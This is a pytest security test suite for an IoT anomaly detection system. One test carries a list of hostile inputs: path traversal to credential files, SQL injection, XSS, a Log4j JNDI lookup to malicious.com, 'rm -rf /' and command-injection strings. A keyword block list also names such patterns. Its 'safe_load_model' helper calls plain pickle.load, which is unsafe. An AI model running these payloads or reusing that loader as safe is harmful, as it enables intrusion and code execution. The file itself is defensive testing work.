"""
Comprehensive security tests for IoT Edge Anomaly Detection system.

This module tests various security aspects including input validation,
authentication, data protection, and vulnerability resistance.
"""

import pytest
import torch
import numpy as np
import json
import time
from unittest.mock import Mock, patch
from parameterized import parameterized


class TestInputValidation:
    """Security tests for input validation and sanitization."""

    @pytest.mark.security
    @pytest.mark.parametrize("malicious_input", [
        "../../../etc/passwd",
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://malicious.com/a}",
        "../../../../windows/system32/config/sam",
        "|cat /etc/passwd",
        "`whoami`",
        "rm -rf /",
    ])
    def test_malicious_string_input_rejection(self, malicious_input):
        """Test system rejects various malicious string inputs."""
        
        def validate_string_input(user_input: str) -> bool:
            """Mock input validation function."""
            dangerous_patterns = [
                "../", "..\\",  # Path traversal
                "DROP", "DELETE", "UPDATE", "INSERT",  # SQL injection
                "<script>", "javascript:",  # XSS
                "${jndi:", "${java:",  # Log4j style injection
                "|", ";", "`", "$(",  # Command injection
                "rm ", "del ", "format ",  # Dangerous commands
            ]
            
            user_input_upper = user_input.upper()
            return not any(pattern.upper() in user_input_upper for pattern in dangerous_patterns)
        
        # Test that malicious input is rejected
        assert not validate_string_input(malicious_input), f"Failed to reject malicious input: {malicious_input}"

    @pytest.mark.security
    def test_numeric_input_bounds_validation(self):
        """Test numeric input validation prevents overflow and underflow."""
        
        def validate_numeric_input(value):
            """Mock numeric input validation."""
            if not isinstance(value, (int, float)):
                return False
            if np.isnan(value) or np.isinf(value):
                return False
            if abs(value) > 1e6:  # Reasonable bounds for sensor data
                return False
            return True
        
        # Test valid inputs
        valid_inputs = [0, 1.5, -10.2, 1000, -1000]
        for value in valid_inputs:
            assert validate_numeric_input(value), f"Valid input rejected: {value}"
        
        # Test invalid inputs
        invalid_inputs = [float('inf'), float('nan'), 1e10, -1e10, "string", None]
        for value in invalid_inputs:
            assert not validate_numeric_input(value), f"Invalid input accepted: {value}"

    @pytest.mark.security
    def test_tensor_input_validation(self):
        """Test PyTorch tensor input validation for ML models."""
        
        def validate_tensor_input(tensor):
            """Mock tensor input validation."""
            if not isinstance(tensor, torch.Tensor):
                return False
            if torch.isnan(tensor).any() or torch.isinf(tensor).any():
                return False
            if tensor.numel() > 1e6:  # Prevent memory exhaustion
                return False
            if tensor.abs().max() > 1e3:  # Reasonable value bounds
                return False
            return True
        
        # Valid tensors
        valid_tensors = [
            torch.randn(10, 5),
            torch.zeros(1, 1),
            torch.ones(100),
        ]
        
        for tensor in valid_tensors:
            assert validate_tensor_input(tensor), f"Valid tensor rejected"
        
        # Invalid tensors
        invalid_tensors = [
            torch.tensor([float('nan')]),
            torch.tensor([float('inf')]),
            torch.ones(10000, 10000),  # Too large
            torch.tensor([1e6]),  # Value too large
        ]
        
        for tensor in invalid_tensors:
            assert not validate_tensor_input(tensor), f"Invalid tensor accepted"


class TestAuthenticationSecurity:
    """Security tests for authentication mechanisms."""

    @pytest.mark.security
    @pytest.mark.network
    def test_jwt_token_validation(self):
        """Test JWT token validation prevents unauthorized access."""
        import base64
        import hmac
        import hashlib
        
        def validate_jwt_token(token, secret_key):
            """Mock JWT validation."""
            try:
                parts = token.split('.')
                if len(parts) != 3:
                    return False
                
                header, payload, signature = parts
                
                # Verify signature
                expected_signature = base64.urlsafe_b64encode(
                    hmac.new(
                        secret_key.encode(),
                        f"{header}.{payload}".encode(),
                        hashlib.sha256
                    ).digest()
                ).decode().rstrip('=')
                
                return hmac.compare_digest(signature, expected_signature)
            except Exception:
                return False
        
        secret_key = "test_secret_key"
        
        # Create valid token parts
        header = base64.urlsafe_b64encode('{"alg":"HS256","typ":"JWT"}'.encode()).decode().rstrip('=')
        payload = base64.urlsafe_b64encode('{"sub":"user123","exp":9999999999}'.encode()).decode().rstrip('=')
        
        # Valid signature
        valid_signature = base64.urlsafe_b64encode(
            hmac.new(
                secret_key.encode(),
                f"{header}.{payload}".encode(),
                hashlib.sha256
            ).digest()
        ).decode().rstrip('=')
        
        valid_token = f"{header}.{payload}.{valid_signature}"
        assert validate_jwt_token(valid_token, secret_key), "Valid JWT rejected"
        
        # Invalid tokens
        invalid_tokens = [
            "invalid.token.format",
            f"{header}.{payload}.invalid_signature",
            "malformed_token",
            "",
        ]
        
        for invalid_token in invalid_tokens:
            assert not validate_jwt_token(invalid_token, secret_key), f"Invalid JWT accepted: {invalid_token}"

    @pytest.mark.security
    def test_api_rate_limiting(self):
        """Test API rate limiting prevents abuse."""
        
        class RateLimiter:
            def __init__(self, max_requests=100, window_seconds=60):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests = {}
            
            def is_allowed(self, client_id):
                current_time = time.time()
                client_requests = self.requests.get(client_id, [])
                
                # Remove old requests
                client_requests = [req_time for req_time in client_requests 
                                 if current_time - req_time < self.window_seconds]
                
                # Check rate limit
                if len(client_requests) >= self.max_requests:
                    return False
                
                # Add current request
                client_requests.append(current_time)
                self.requests[client_id] = client_requests
                return True
        
        rate_limiter = RateLimiter(max_requests=5, window_seconds=60)
        
        # Normal usage should be allowed
        for _ in range(5):
            assert rate_limiter.is_allowed("client1"), "Normal request blocked"
        
        # Excessive requests should be blocked
        assert not rate_limiter.is_allowed("client1"), "Rate limit not enforced"


class TestDataProtection:
    """Security tests for data protection and privacy."""

    @pytest.mark.security
    def test_sensitive_data_masking(self):
        """Test sensitive data is properly masked in logs and outputs."""
        
        def mask_sensitive_data(data_dict):
            """Mock sensitive data masking function."""
            sensitive_keys = ['password', 'token', 'api_key', 'secret', 'private_key']
            masked_data = data_dict.copy()
            
            for key, value in masked_data.items():
                if any(sensitive_key in key.lower() for sensitive_key in sensitive_keys):
                    if isinstance(value, str) and len(value) > 4:
                        masked_data[key] = value[:2] + '*' * (len(value) - 4) + value[-2:]
                    else:
                        masked_data[key] = '***'
            
            return masked_data
        
        # Test data with sensitive information
        test_data = {
            'username': 'testuser',
            'password': 'secret123',
            'api_key': 'sk-1234567890abcdef',
            'device_id': 'device001',
            'jwt_token': 'eyJhbGciOiJIUzI1NiJ9.payload.signature'
        }
        
        masked_data = mask_sensitive_data(test_data)
        
        # Verify sensitive data is masked
        assert 'secret123' not in str(masked_data), "Password not masked"
        assert 'sk-1234567890abcdef' not in str(masked_data), "API key not masked"
        assert 'eyJhbGciOiJIUzI1NiJ9.payload.signature' not in str(masked_data), "JWT token not masked"
        
        # Verify non-sensitive data is preserved
        assert masked_data['username'] == 'testuser'
        assert masked_data['device_id'] == 'device001'

    @pytest.mark.security
    def test_data_encryption_at_rest(self):
        """Test data encryption for storage."""
        from cryptography.fernet import Fernet
        
        # Generate encryption key
        key = Fernet.generate_key()
        cipher_suite = Fernet(key)
        
        # Test data
        sensitive_data = {
            'model_weights': [1.0, 2.0, 3.0],
            'device_config': {'id': 'device001', 'location': 'factory_a'},
            'metrics': {'accuracy': 0.95, 'latency': 0.008}
        }
        
        # Encrypt data
        serialized_data = json.dumps(sensitive_data).encode()
        encrypted_data = cipher_suite.encrypt(serialized_data)
        
        # Verify data is encrypted (not readable)
        assert b'model_weights' not in encrypted_data
        assert b'device001' not in encrypted_data
        
        # Decrypt and verify integrity
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        recovered_data = json.loads(decrypted_data.decode())
        
        assert recovered_data == sensitive_data


class TestVulnerabilityResistance:
    """Tests for resistance against common vulnerabilities."""

    @pytest.mark.security
    def test_buffer_overflow_protection(self):
        """Test protection against buffer overflow attacks."""
        
        def safe_string_copy(source, max_length=1000):
            """Mock safe string copying function."""
            if len(source) > max_length:
                raise ValueError(f"String length {len(source)} exceeds maximum {max_length}")
            return source
        
        # Normal strings should work
        normal_string = "A" * 100
        assert safe_string_copy(normal_string) == normal_string
        
        # Oversized strings should be rejected
        oversized_string = "A" * 10000
        with pytest.raises(ValueError):
            safe_string_copy(oversized_string)

    @pytest.mark.security
    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attacks."""
        
        def allocate_tensor_safely(shape, max_elements=1000000):
            """Mock safe tensor allocation."""
            total_elements = np.prod(shape)
            if total_elements > max_elements:
                raise ValueError(f"Tensor size {total_elements} exceeds maximum {max_elements}")
            return torch.zeros(shape)
        
        # Normal tensors should work
        normal_tensor = allocate_tensor_safely((100, 100))
        assert normal_tensor.shape == (100, 100)
        
        # Massive tensors should be rejected
        with pytest.raises(ValueError):
            allocate_tensor_safely((10000, 10000))

    @pytest.mark.security
    def test_deserialization_safety(self):
        """Test safe deserialization of model files."""
        import pickle
        import tempfile
        import os
        
        def safe_load_model(file_path, allowed_classes=None):
            """Mock safe model loading function."""
            if allowed_classes is None:
                allowed_classes = {'torch', 'numpy', 'collections', 'builtins'}
            
            try:
                with open(file_path, 'rb') as f:
                    # In real implementation, would use restricted unpickler
                    data = pickle.load(f)
                    
                    # Basic safety check - ensure it's a dict with expected keys
                    if isinstance(data, dict) and 'model_state_dict' in data:
                        return data
                    else:
                        raise ValueError("Invalid model file format")
            except Exception as e:
                raise ValueError(f"Failed to safely load model: {e}")
        
        # Create a safe model file
        with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
            safe_model_data = {
                'model_state_dict': {'layer.weight': torch.randn(10, 5)},
                'optimizer_state_dict': {},
                'epoch': 100
            }
            pickle.dump(safe_model_data, f)
            safe_file_path = f.name
        
        try:
            # Loading safe file should work
            loaded_data = safe_load_model(safe_file_path)
            assert 'model_state_dict' in loaded_data
            
        finally:
            os.unlink(safe_file_path)


class TestModelSecurity:
    """Security tests specific to ML models."""

    @pytest.mark.security
    @pytest.mark.ml_model
    def test_adversarial_robustness(self):
        """Test model robustness against adversarial examples."""
        
        def generate_adversarial_example(clean_input, epsilon=0.1):
            """Generate adversarial example using FGSM-like approach."""
            # Mock adversarial perturbation
            perturbation = torch.randn_like(clean_input) * epsilon
            return clean_input + perturbation
        
        def model_prediction(input_tensor):
            """Mock model prediction."""
            return torch.sigmoid(torch.sum(input_tensor, dim=-1))
        
        # Clean input
        clean_input = torch.randn(1, 10, 51)
        clean_prediction = model_prediction(clean_input)
        
        # Adversarial input
        adversarial_input = generate_adversarial_example(clean_input)
        adversarial_prediction = model_prediction(adversarial_input)
        
        # Model should be reasonably robust
        prediction_difference = torch.abs(clean_prediction - adversarial_prediction)
        assert prediction_difference < 0.3, "Model too sensitive to adversarial perturbations"

    @pytest.mark.security
    @pytest.mark.ml_model
    def test_model_inversion_resistance(self):
        """Test resistance against model inversion attacks."""
        
        def extract_training_data_attempt(model_outputs):
            """Mock attempt to extract training data from model outputs."""
            # In a real model inversion attack, attacker would try to
            # reconstruct training data from model predictions
            
            # For this test, we simulate that extraction is unsuccessful
            # if outputs don't contain obvious patterns
            outputs_array = torch.stack(model_outputs)
            
            # Check if outputs reveal obvious patterns that could leak training data
            output_variance = torch.var(outputs_array)
            output_entropy = -torch.sum(outputs_array * torch.log(outputs_array + 1e-8))
            
            # High variance and entropy indicate less information leakage
            return output_variance > 0.1 and output_entropy > 1.0
        
        # Simulate diverse model outputs (good - less information leakage)
        diverse_outputs = [torch.rand(10) * 0.5 + 0.25 for _ in range(100)]
        assert extract_training_data_attempt(diverse_outputs), "Model outputs may leak training data"
        
        # Simulate uniform outputs (bad - potential information leakage)
        uniform_outputs = [torch.ones(10) * 0.5 for _ in range(100)]
        assert not extract_training_data_attempt(uniform_outputs), "Test setup error"

    @pytest.mark.security
    @pytest.mark.ml_model
    def test_membership_inference_resistance(self):
        """Test resistance against membership inference attacks."""
        
        def membership_inference_attack(model_confidence, threshold=0.9):
            """Mock membership inference attack."""
            # High confidence might indicate the sample was in training data
            return model_confidence > threshold
        
        # Simulate model confidences for training and test data
        training_confidences = torch.rand(100) * 0.3 + 0.7  # Higher confidence
        test_confidences = torch.rand(100) * 0.5 + 0.5      # Lower confidence
        
        # Attack success rate should be low for good privacy protection
        training_inferred = sum(membership_inference_attack(conf) for conf in training_confidences)
        test_inferred = sum(membership_inference_attack(conf) for conf in test_confidences)
        
        # If attack works perfectly, all training samples would be identified
        # Good privacy protection means low attack success rate
        attack_success_rate = (training_inferred + (100 - test_inferred)) / 200
        assert attack_success_rate < 0.7, f"Membership inference attack too successful: {attack_success_rate}"


class TestSecureDeployment:
    """Security tests for deployment configurations."""

    @pytest.mark.security
    @pytest.mark.docker
    def test_container_security_configuration(self):
        """Test Docker container security configurations."""
        
        def validate_container_config(config):
            """Mock container security validation."""
            security_checks = {
                'non_root_user': config.get('user') != 'root',
                'read_only_filesystem': config.get('read_only', False),
                'no_privileged': not config.get('privileged', False),
                'resource_limits': 'memory' in config.get('limits', {}),
                'no_host_network': config.get('network_mode') != 'host',
                'capabilities_dropped': 'ALL' in config.get('cap_drop', []),
            }
            return all(security_checks.values()), security_checks
        
        # Secure configuration
        secure_config = {
            'user': 'appuser',
            'read_only': True,
            'privileged': False,
            'limits': {'memory': '100M', 'cpu': '0.25'},
            'network_mode': 'bridge',
            'cap_drop': ['ALL'],
        }
        
        is_secure, checks = validate_container_config(secure_config)
        assert is_secure, f"Secure config failed checks: {checks}"
        
        # Insecure configuration
        insecure_config = {
            'user': 'root',
            'privileged': True,
            'network_mode': 'host',
        }
        
        is_secure, checks = validate_container_config(insecure_config)
        assert not is_secure, "Insecure config passed validation"

    @pytest.mark.security
    @pytest.mark.network
    def test_network_security_policies(self):
        """Test network security policies and firewalling."""
        
        def validate_network_policy(policy):
            """Mock network policy validation."""
            required_rules = {
                'deny_all_default': policy.get('default_action') == 'DENY',
                'explicit_allow_rules': len(policy.get('allow_rules', [])) > 0,
                'no_wildcards': not any('*' in rule.get('source', '') for rule in policy.get('allow_rules', [])),
                'port_restrictions': all(
                    isinstance(rule.get('port'), int) and 1024 <= rule.get('port') <= 65535
                    for rule in policy.get('allow_rules', [])
                ),
            }
            return all(required_rules.values()), required_rules
        
        # Secure network policy
        secure_policy = {
            'default_action': 'DENY',
            'allow_rules': [
                {'source': '10.0.0.0/8', 'port': 8080, 'protocol': 'TCP'},
                {'source': '192.168.1.0/24', 'port': 9090, 'protocol': 'TCP'},
            ]
        }
        
        is_secure, checks = validate_network_policy(secure_policy)
        assert is_secure, f"Secure network policy failed: {checks}"


# Performance tests with security implications
class TestSecurePerformance:
    """Performance tests that also validate security properties."""

    @pytest.mark.security
    @pytest.mark.performance
    def test_cryptographic_operations_performance(self):
        """Test cryptographic operations don't create performance bottlenecks."""
        import hashlib
        
        start_time = time.time()
        
        # Simulate cryptographic operations during normal operation
        for _ in range(1000):
            data = "sample_sensor_data_" + str(_)
            hash_digest = hashlib.sha256(data.encode()).hexdigest()
            
        end_time = time.time()
        
        # Cryptographic operations should be fast enough for real-time processing
        total_time = end_time - start_time
        assert total_time < 1.0, f"Cryptographic operations too slow: {total_time}s"

    @pytest.mark.security
    @pytest.mark.performance
    def test_secure_data_transmission_overhead(self):
        """Test secure data transmission doesn't exceed performance budgets."""
        
        def simulate_secure_transmission(data_size_mb, encryption_overhead=1.2):
            """Mock secure data transmission with encryption overhead."""
            base_transmission_time = data_size_mb * 0.01  # 10ms per MB
            secure_transmission_time = base_transmission_time * encryption_overhead
            return secure_transmission_time
        
        # Test various data sizes
        test_cases = [
            (1, 0.05),    # 1MB should take < 50ms
            (10, 0.5),    # 10MB should take < 500ms
            (100, 5.0),   # 100MB should take < 5s
        ]
        
        for data_size, max_time in test_cases:
            transmission_time = simulate_secure_transmission(data_size)
            assert transmission_time < max_time, f"Secure transmission too slow for {data_size}MB"